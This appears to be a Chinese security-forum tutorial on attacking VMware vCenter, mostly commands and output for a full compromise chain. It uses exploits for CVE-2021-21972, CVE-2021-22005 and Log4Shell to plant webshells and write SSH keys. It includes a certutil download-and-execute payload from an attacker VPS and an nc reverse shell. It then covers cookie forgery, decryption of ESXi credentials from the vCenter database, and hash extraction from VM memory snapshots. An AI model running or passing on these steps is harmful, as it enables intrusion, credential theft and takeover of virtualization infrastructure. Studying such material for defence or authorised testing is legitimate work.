0x01 指纹特征
=========

```php
title="+ ID_VC_Welcome +"
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-45ce5cec25a6cb4322a561fe2c04136bae411055.png)

0x02 查看Vcenter版本
================

```php
/sdk/vimServiceVersions.xml
```

![image-20220902150355359.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-02419232508a0922d3d8547ae163c292ac8da5c9.png)

0x03 CVE-2021-21972
===================

影响范围

- vCenter Server7.0 &lt; 7.0.U1c
- vCenter Server6.7 &lt; 6.7.U3l
- vCenter Server6.5 &lt; 6.5.U3n

```php
/ui/vropspluginui/rest/services/uploadova
```

访问上面的路径，如果404，则代表不存在漏洞，如果405 则可能存在漏洞

![image-20220724170308995.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a4f311259bf1fcf71d02eec1188ccfbf13e7f350.png)  
windows机器：

漏洞利用： <https://github.com/horizon3ai/CVE-2021-21972>

```xml
python CVE-2021-21972.py -t x.x.x.x -p ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\gsl.jsp -o win -f gsl.jsp

-t （目标地址）
-f （上传的文件）
-p （上传后的webshell路径，默认不用改）
```

![image-20220724170308995.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a70674a467b5e1af4084303d0ee2018cbd8d9e53.png)  
上传后的路径为

```php
https://x.x.x.x/statsreport/gsl.jsp
```

完整路径为

```php
C:/ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport
```

![image-20220813172742556.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-32ae6de3c25ebd05e88d0782435b9f27060d8372.png)  
Linux机器：

1、写公私钥（需要22端口开放）

```php
python3 CVE-2021-21972.py -t x.x.x.x -p /home/vsphere-ui/.ssh/authorized_keys -o unix -f id_rsa_2048.pub
```

2、遍历写shell（时间较久）

<https://github.com/NS-Sp4ce/CVE-2021-21972>

![image-20220829190235482.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-05a913d41bb24b91bcf29d675c43a0216dbb7588.png)

0x04 CVE-2021-22005
===================

影响范围

- vCenter Server 7.0 &lt; 7.0 U2c build-18356314
- vCenter Server 6.7 &lt; 6.7 U3o build-18485166
- Cloud Foundation (vCenter Server) 4.x &lt; KB85718 (4.3)
- Cloud Foundation (vCenter Server) 3.x &lt; KB85719 (3.10.2.2)
- 6.7 vCenters Windows版本不受影响

漏洞利用

<https://github.com/r0ckysec/CVE-2021-22005>

```php
cve-2021-22005_exp_win.exe -u https://x.x.x.x --shell
```

![image-20220813184455354.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0bef920cb8b4a431b619df713889aadb8e98bc21.png)

<https://github.com/rwincey/CVE-2021-22005/blob/main/CVE-2021-22005.py>

```php
python cve-2021-22005.py -t https://x.x.x.x
```

![image-20220813190026044.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-82ad078909b942162f90c1ebaeaa801e4a739eeb.png)

连接webshell

```php
https://x.x.x.x/idm/..;/test.jsp
```

![image-20220813185938630.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2a58627c60e7afc64a7ff5852c35add37a5a30cb.png)

上传后的webshell完整路径为

```php
/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xx.jsp
```

0x05 CVE-2021-44228
===================

利用log4j漏洞，漏洞触发点为XFF头部

```php
GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
Host: 192.168.121.137
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Dnt: 1
X-Forwarded-For: ${jndi:ldap://9qphlt.dnslog.cn}
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

DNSlog探测漏洞是否存在

```php
X-Forwarded-For: ${jndi:ldap://9qphlt.dnslog.cn}
```

![image-20220902150833322.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a9cec220ce57579231dd1299a825d5f910847abd.png)

使用 JNDIExploit 工具，`-u` 查看可执行命令

![image-20220902152302899.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c5109ee11cd47a1f42546136e8c1073ba3314609.png)

漏洞利用：

```php
java -jar JNDIExploit-1.3-SNAPSHOT.jar -i VPSIP
X-Forwarded-For: ${jndi:ldap://VPSIP:1389/TomcatBypass/TomcatEcho}
cmd:
```

![image-20220902152705873.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-de44a89636b00e57bfc361f51b20cf3bc6a24306.png)  
![image-20220902151954111.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-b16b8fc8ce5bf2d90afee85dd77d709602f82054.png)

cs上线

```php
GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
Host: 192.168.121.142
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Dnt: 1
cmd: certutil -urlcache -split -f http://VPS C:\Users\Public\1.exe &amp;&amp; C:\Users\Public\1.exe
X-Forwarded-For: ${jndi:ldap://VPS:1389/TomcatBypass/TomcatEcho}
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![image-20220902155509783.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-1068158a10b3a438807208ce7e9995916e5b2382.png)

Linux使用反弹shell命令

```php
nc -e /bin/sh 10.10.10.10 8888
nc -lvp 8888
```

弹回来若是非交互式shell没有回显，使用以下命令切换为交互式

```php
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20220902161936653.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0c02bcea53d29f1dcc604d4d02e2f61a1590bd97.png)

0x06 获取vcenter-web控制台权限
=======================

重置密码
----

比较快的一种方法，但是修改之后无法获取原来的密码，管理员会发现密码被改

选择 3 选项，输入默认 administrator@vsphere.local （需要管理员权限）

```php
#Linux 
/usr/lib/vmware-vmdir/bin/vdcadmintool 

#Windows 
C:\Program Files\Vmware\vCenter Server\vmdird\vdcadmintool.exe
```

![image-20220829144257277.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-ec55781e81c4dc199cc3320976acea1f342ff522.png)

cookie登录
--------

通过解密数据库登录获取cookie，再用cookie登录web

解密脚本：[https://github.com/horizon3ai/vcenter\_saml\_login](https://github.com/horizon3ai/vcenter_saml_login)

```php
python vcenter_saml_login.py -p data.mdb -t 10.9.16.11 
```

然后会生成相应的cookie，访问 `ui` 路径进行 cookie 替换即可

```php
#Linux
/storage/db/vmware-vmdir/data.mdb

#windows
C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
```

![image-20220824120811883.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-6661eb592e614bb7eb227a04ce148565e50975f9.png)  
使用小饼干替换cookie，成功登录  
![image-20220824134338223.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-79bdcc7a3b6f83fd6c4788e334534b26c9f9b266.png)  
windows运行脚本需要安装对应版本的python-ldap

```php
https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap1
pip install python_ldap-3.4.0-cp38-cp38-win_amd64.whl
pip install -r requirements.txt
```

![image-20220824120857075.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2ad5d2d3125ce692197ced645d3df4660d7b8145.png)  
![image-20220824120622726.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d96ab1b0e22d1725d2cd3455ed2a937d1ed27b00.png)  
实际测试过程中发现windows的data.mdb文件过大，拉回来不是那么方便，适合Linux机器

![image-20220824114156587.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-250de43c99725ca4f12afe30a57e4a350b67ed07.png)  
这时候如果目标机器上装有python环境，可使用3gstudent师傅的脚本进行利用

[https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter\_ExtraCertFromMdb.py](https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py)

```php
python vCenter_ExtraCertFromMdb.py data.mdb
```

![image-20220829120100199.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-4619bf0737ffdd59d73a223ba385b0a3cf835504.png)

运行脚本会生成三段证书文件，放置到相应的位置

[https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter\_GenerateLoginCookie.py](https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_GenerateLoginCookie.py)

```php
python vCenter_GenerateLoginCookie.py 192.168.121.135 192.168.121.135 vsphere.local idp_cert.txt trusted_cert_1.txt trusted_cert_2.txt
```

![image-20220829142148838.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-202ffc37ef1c16616eb80800a3afbf4933f0b177.png)

不重置获取密码（ESXI）
-------------

查看域

```php
#Linux
/usr/lib/vmware-vmafd/bin/vmafd-cli get-domain-name --server-name localhost

#windows
C:\Program Files\VMware\vCenter Server\vmafdd\vmafd-cli get-domain-name --server-name localhost
C:\PROGRA~1\VMware\"vCenter Server"\vmafdd\vmafd-cli get-domain-name --server-name localhost
```

坑点：由于路径中间存在空格，导致识别不了

![image-20220815103945952.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-547953d25071a5ded4f9fe0a36ec1271cf0719f9.png)  
解决方法：使用双引号对含有空格的路径进行单独处理

![image-20220815104048896.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-fd5f28e6c0e350611fd408e28c3ea62be0cb9246.png)

### 1、获取解密key

```php
#Windows
type C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\ssl\symkey.dat

#Linux
cat /etc/vmware-vpx/ssl/symkey.dat
```

![image-20220813161905824.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-416d9551fd7fc500ce00e07afaa68f8ea2857966.png)

### 2、获取数据库账号密码

vcenter默认数据库文件存放在vcdb.properties，配置文件中有数据库的明文账号密码

```php
#Linux
cat /etc/vmware-vpx/vcdb.properties
cat /etc/vmware/service-state/vpxd/vcdb.properties

#Windows
type C:\ProgramData\VMware\"VMware VirtualCenter"\vcdb.properties
type C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
```

![image-20220813184742819.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2941c7d4897a9f6c8f558372d0e38626164e97a3.png)

![image-20220813191535308.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3b90201348bc0b855105a0d8bbaea4f1eee01d13.png)

默认是postgresql数据库，只能在vCenter服务器本地登录，执行语句查询ESXI的密码

```php
#psql默认存放位置
Windows: C:\Program Files\VMware\vCenter Server\vPostgres\bin\psql.exe
Linux: /opt/vmware/vpostgres/9.3/bin/psql

#执行语句查询
psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;" &gt; password.enc

#执行完会输出一段加密字段
Command&gt; shell psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;" &gt; password.enc
Shell access is granted to root
Password for user vc: 
ip_address  | user_name |                                         password                                      
-------------+-----------+---------------------------------------------------------------------------------------
192.168.1.1 | vpxuser   | *H8BBiGe3kQqaujz3ptZvzhWXXZ0M6QOoOFIKL0p0cUDkWF/iMwikwt7BCrfEDRnXCqxoju4t2fsRV3xNMg==
192.168.1.2 | vpxuser   | *zR20RvimwMPHz7U6LJW+GnmLod9pdHpdhIFO+Ooqk0/pn2NGDuKRae+ysy3rxBdwepRzNLdq6+paOgi54Q==
192.168.1.3 | vpxuser   | *Q81OIBXziWr0orka0j++PKMSgw6f7kC0lCmITzSlbl/jCDTuRSs07oQnNFpSCC6IhZoPPto5ix0SccQPDw==
192.168.1.4 | vpxuser   | *R6HqZzojKrFeshDIP8vXPMhN28mLDHiEEBSXWYXNHrQQvHcuLOFlLquI2oLRfqLiPlHwkmAxUj9hKj3VZA==
(4 rows)

#只保留password字段
*H8BBiGe3kQqaujz3ptZvzhWXXZ0M6QOoOFIKL0p0cUDkWF/iMwikwt7BCrfEDRnXCqxoju4t2fsRV3xNMg==
*zR20RvimwMPHz7U6LJW+GnmLod9pdHpdhIFO+Ooqk0/pn2NGDuKRae+ysy3rxBdwepRzNLdq6+paOgi54Q==
*Q81OIBXziWr0orka0j++PKMSgw6f7kC0lCmITzSlbl/jCDTuRSs07oQnNFpSCC6IhZoPPto5ix0SccQPDw==
*R6HqZzojKrFeshDIP8vXPMhN28mLDHiEEBSXWYXNHrQQvHcuLOFlLquI2oLRfqLiPlHwkmAxUj9hKj3VZA==
```

在实际情况中也碰到使用 MSSQL 数据库的情况，这时候直接使用 navicat 进行连接，搜索 `VPX_HOST` 表

![image-20220815144326190.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-fea62ebb4aef3c89a4299b30bb8508b11b83fbbc.png)

![image-20220815141131592.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-6d53bc3bf138dee12dfaca4de4114aa92ad4838b.png)

### 3、使用脚本解密

[https://github.com/shmilylty/vhost\_password\_decrypt](https://github.com/shmilylty/vhost_password_decrypt)

- password字段放到password.enc里面
- symkey.dat为第一步获取的解密key

![image-20220815134235378.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-af6bfe36a7e72790134c4642412fb4a8e531fd48.png)

```php
python decrypt.py symkey.dat password.enc password.txt
```

执行脚本后，会输出一个password.txt，里面存放着对应 ip\_address 的 ESXI 机器密码

### 4、登录ESXI

在 ESXI 机器地址后面添加 `/ui` ，访问web控制台，账密为 `vpxuser/password.txt里的密码`

![image-20220815132316991.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e12f8370c5250949431467ed72ccf5c54ada4c40.png)

![image-20220815135054173.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-98c6f4dd7a23d1eb6a79482a0f99e830849ec084.png)  
解密出来的密码除了可以登录web控制台以外还可以ssh登录机器，不过需要服务里开启 SSH 安全shell

![image-20220815143721321.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e3664b8577928c49ee2531d362c2d604a743ac90.png)

![image-20220824135257496.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-9bc82bbe9595b2b9f511646d3be57d1130854eb3.png)

0x07 获取虚拟机权限
============

登录web控制台后，想要获取某个虚拟机的权限，比如说目标系统为靶标

选择目标虚拟机，操作生成快照

![image-20220901170459802.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0d9f53815495ae22684a7027552dd9d1a94c2f53.png)  
到数据存储位置找到相应的快照文件

![image-20220901150507397.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7148d3728ea7ae3c6d18f5b480d001fb609d2cb8.png)  
也可以通过 ssh 登录ESXI服务器上，通过 find 找出相应的 `vmem` 和 `vmsn` 文件拷贝到本地

```php
find / -name "*.vmem"
```

![image-20220901163008934.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e0bf047d26039746e099a46625408943596595b8.png)  
<https://www.volatilityfoundation.org/releases>

使用 volatility 工具查看 profile

```php
volatility_2.6_win64_standalone.exe -f WindowsServer2008r2.vmem imageinfo
```

![image-20220901165506218.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d21d629314ed0df42fce54b274358c24352eea83.png)  
读取注册表

```php
volatility_2.6_win64_standalone.exe -f WindowsServer2008r2.vmem --profile=Win7SP1x64 hivelist
```

![image-20220901170657774.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-47e120be2b0b7a76cd4bd3156dc878aaa40c7ce6.png)  
获取hash并解出密码

```php
volatility_2.6_win64_standalone.exe -f WindowsServer2008r2.vmem --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a00084c010
```

![image-20220901170740133.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d2a6267cfca41b6b3dfda107d713ee7dd9843cf9.png)

![image-20220901155122168.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3597c5317a6c96684d2ea584ae24c3500f651b91.png)